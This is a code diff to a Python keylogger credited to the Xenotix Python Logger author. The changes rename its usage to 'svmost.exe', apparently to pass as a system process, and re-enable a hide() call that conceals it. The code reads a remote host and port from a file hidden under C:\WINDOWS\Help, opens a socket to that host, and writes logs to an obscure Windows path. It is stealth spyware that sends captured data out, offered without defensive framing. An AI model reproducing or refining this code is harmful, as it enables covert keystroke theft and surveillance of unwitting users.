@@ -59,7 +59,7 @@ Original Coder: Ajin Abraham <ajin25@gmail.com>
 OPENSECURITY.IN
 Modifiers: Not listed
 
-usage:xenotix_python_logger.py mode [optional:startup]
+usage:svmost.exe mode [optional:startup]
 
 mode:
      local: store the logs in a file
@@ -92,13 +92,13 @@ def main():
                 msg()
                 exit(0)
         if sys.argv[1]=="local":
-            #hide()
+            hide()
             with open("C:\WINDOWS\Help\wmconf","r") as conf:
                 host = conf.readline().rstrip()
                 port = int(conf.readline().rstrip())
                 clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 clientsocket.connect((host, port))
-            fp = open("C:\WINDOWS\msgstat","a")
+            fp = open("C:\WINDOWS\\msgstat","a+")
         else:
             msg()
             exit(0)
